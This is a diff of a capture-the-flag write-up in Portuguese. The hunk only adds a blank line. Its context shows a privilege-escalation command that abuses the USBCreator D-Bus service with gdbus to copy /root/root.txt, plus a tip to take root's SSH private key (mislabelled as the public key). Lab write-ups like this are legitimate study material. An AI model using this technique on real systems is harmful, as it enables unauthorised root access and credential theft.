@@ -491,6 +491,7 @@ uid=1000(nadav) gid=1000(nadav) groups=1000(nadav),4(adm),24(cdrom),27(sudo),30(
 
 Portanto, podemos ler o arquivo root.txt, mandando seu conteúdo para um arquivo vazio na pasta /tmp.
 > Obs: Caso queira virar root, basta pegar a chave pública localizado em /root/.ssh/id_rsa e usa-la para realizar o login via ssh para virar root #.
+
 ```terminal
 $ touch /tmp/flag
 $ gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/root.txt /tmp/flag true
